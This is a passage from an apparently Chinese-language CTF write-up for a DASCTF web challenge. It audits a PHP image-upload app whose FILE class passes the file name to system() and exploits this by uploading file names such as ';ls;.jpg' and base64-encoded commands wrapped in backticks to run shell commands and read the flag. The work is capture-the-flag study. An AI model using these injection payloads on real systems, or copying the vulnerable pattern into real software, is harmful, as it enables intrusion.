invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;图片已删除!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>审计代码，发现能够上传文件。当<code>$_SESSION[&#39;user&#39;]</code>不为空且<code>file</code>不存在时，可以上传文件，而登录成功后，<code>$_SESSION[&#39;user&#39;]</code>就不为空了。</p></li><li><p>进一步发现，当<code>file</code>变量存在时，new了一个<code>FILE($filename);</code>。</p></li><li><p>查看这个类，发现这个类在<code>__destruct</code>时会将文件名当成命令来执行，而且在<code>__construct</code>时，会判断文件名是否只有一个<code>.</code>且没有<code>/</code>，同时还会判断文件是否存在。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>于是编写一个文件上传的页面，抓包，并将包修改一下。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;file&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#4CAF50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#45a049</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d4cdc047-fde9-4f75-99ce-4f8b8d0cb06c.node4.buuoj.cn:81/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>选择文件<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;上传&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/DASCTF/My4.png"></p></li><li><p>接着发包两次，出现文件上传成功，接着修改文件名为<code>;ls;.jpg</code>，上传成功后，访问<code>?file=;ls;.jpg</code>，发现可以rce了。</p><p><img src="/DASCTF/My2.png"></p><p><img src="/DASCTF/My3.png"></p></li><li><p>因为<code>.</code>和<code>/</code>用不了，所以我们使用echo命令+反斜杠的方法来rce。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">比如 `echo 需要执行命令的base64编码 | base64 -d`</span><br><span class="line">传入文件名 ;`echo bHMgLw== | base64 -d`;.jpg ，即可成功查看根目录。</span><br></pre></td></tr></table></figure><p><img src="/DASCTF/My6.png"></p><p><img src="/DASCTF/My5.png"></p></li><li><p>最后上传文件名为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br></pre></td></tr></table></figure><p>即可得到flag。</p><p><img src="/DASCTF/My7.png"></p></li></ol><p>​</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
